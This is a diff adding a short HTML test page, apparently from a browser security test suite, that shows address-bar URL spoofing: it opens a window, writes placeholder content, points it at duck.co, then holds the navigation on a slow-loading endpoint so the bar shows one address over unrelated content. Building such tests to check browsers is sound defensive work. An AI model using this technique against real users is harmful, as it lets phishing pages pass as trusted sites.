@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width">
+  <title>URL Spoofing - JS page rewrite</title>
+  <script>
+    function spoof() {
+      const newWindow = window.open("");
+      newWindow.document.write(`<html><body style="background:#5DBCD2"><p style="text-align:center">This is not the content that belongs to the above URL</p></body></html>`);
+      newWindow.location = "https://duck.co";
+
+      const i = setInterval(() => {
+        try {
+          const x = newWindow.location.href;
+        } catch (e) {
+          clearInterval(i);
+          newWindow.location.replace('http://tests.netsekure.org/slow.php?seconds=10000');
+        }
+      }, 1);
+    }
+  </script>
+</head>
+
+<body>
+  <button onclick="spoof()">Start</button>
+</body>
+
+</html>
